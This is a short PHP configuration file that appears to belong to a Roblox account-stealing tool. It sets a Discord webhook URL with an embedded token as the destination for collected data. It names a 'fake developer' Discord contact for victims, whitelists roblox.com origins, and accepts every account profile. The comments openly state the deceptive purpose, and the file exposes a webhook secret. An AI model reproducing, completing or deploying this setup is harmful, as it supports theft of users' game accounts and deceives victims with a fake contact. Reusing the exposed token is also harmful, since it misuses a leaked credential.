<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/782998228668252211/-jADOQtptf_2Lb0DMQ4GSvYHtkwI8r8IBc8umTtckVPGN6QP1LqGcIEOn5vkC18dfTit";
    // fake developer for the bot the users may contact
    $discord_contact = "Kyle.#6492";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>